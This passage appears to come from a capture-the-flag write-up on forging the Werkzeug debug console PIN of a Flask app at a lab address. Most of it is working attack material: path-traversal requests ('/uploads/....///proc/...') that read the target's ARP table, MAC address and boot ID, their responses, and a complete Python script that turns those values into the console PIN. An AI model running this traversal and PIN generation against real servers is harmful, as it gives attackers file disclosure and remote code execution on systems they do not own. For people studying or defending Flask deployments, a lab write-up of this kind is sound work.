## Generating the Debug Console PIN

Follow the methodology in [this blog post](https://www.daehee.com/werkzeug-console-pin-exploit/) to generate the PIN to access the Flaks debug console.

Run the Docker container locally to determine the values for `probably_public_bits`.

```http
GET /uploads/....///proc/net/arp HTTP/1.1
Host: 10.129.46.240
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1


```

```http
HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.10.3
Date: Mon, 17 Oct 2022 21:21:21 GMT
Content-Disposition: inline; filename=arp
Content-Type: application/octet-stream
Content-Length: 0
Last-Modified: Mon, 17 Oct 2022 21:21:21 GMT
Cache-Control: no-cache
ETag: "1666041681.0466142-0-548799692"
Date: Mon, 17 Oct 2022 21:21:21 GMT
Connection: close

IP address       HW type     Flags       HW address            Mask     Device
172.17.0.1       0x1         0x2         02:42:2c:49:2d:d4     *        eth0
```

```http
GET /uploads/....///sys/class/net/eth0/address HTTP/1.1
Host: 10.129.46.240
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

```http
HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.10.3
Date: Mon, 17 Oct 2022 21:22:23 GMT
Content-Disposition: inline; filename=address
Content-Type: application/octet-stream
Content-Length: 4096
Last-Modified: Mon, 17 Oct 2022 21:22:23 GMT
Cache-Control: no-cache
ETag: "1666041743.978612-4096-2314799615"
Date: Mon, 17 Oct 2022 21:22:23 GMT
Connection: close

02:42:ac:11:00:02
```

```python
>>> print(0x0242ac110002)
2485377892354
```

```http
GET /uploads/....///proc/sys/kernel/random/boot_id HTTP/1.1
Host: 10.129.46.240
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1


```

```http
HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.10.3
Date: Mon, 17 Oct 2022 21:20:06 GMT
Content-Disposition: inline; filename=boot_id
Content-Type: application/octet-stream
Content-Length: 0
Last-Modified: Mon, 17 Oct 2022 17:49:44 GMT
Cache-Control: no-cache
ETag: "1666028984.2350643-0-3138391009"
Date: Mon, 17 Oct 2022 21:20:06 GMT
Connection: close

aea5b0fa-304c-41cc-98af-2d1d1d64aeba
```


```python
import hashlib
from itertools import chain


probably_public_bits = [
	"root", # username
	"flask.app", # modname
	"Flask", # getattr(app, "__name__", type(app).__name__),
	"/usr/local/lib/python3.10/site-packages/flask/app.py" # getattr(mod, "__file__", None),
]

private_bits = [
	'2485377892354', # str(uuid.getnode()),  /sys/class/net/ens33/address
	'aea5b0fa304c41cc98af2d1d1d64aeba' # get_machine_id(), /proc/sys/kernel/random/boot_id
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
	if not bit:
		continue
	if isinstance(bit, str):
		bit = bit.encode('utf-8')
	h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
	h.update(b'pinsalt')
	num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
						  for x in range(0, len(num), group_size))
			break
	else:
		rv = num

print(rv)
```

```bash
$ python3 pin.py
238-465-332
```